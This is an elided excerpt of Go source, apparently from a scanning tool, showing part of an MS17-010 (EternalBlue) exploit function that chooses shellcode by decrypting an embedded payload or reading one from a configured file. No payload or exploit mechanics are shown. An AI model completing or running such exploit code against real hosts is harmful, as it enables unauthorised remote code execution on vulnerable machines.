...
func MS17010EXP(ip string, port int) {
	...
	case "guest":
		...
		sc = aesDecrypt(sc_enc, key)
	default:
		if strings.Contains(config.Get().SC, "file:") {
			read, err := os.ReadFile(config.Get().SC[5:])
			if err != nil {
				errlog := fmt.Sprintf("[-] ms17010 sc readfile %v error: %v", config.Get().SC, err)
				fmt.Printf(errlog)
				logger.OutLog(errlog)
				return
			}
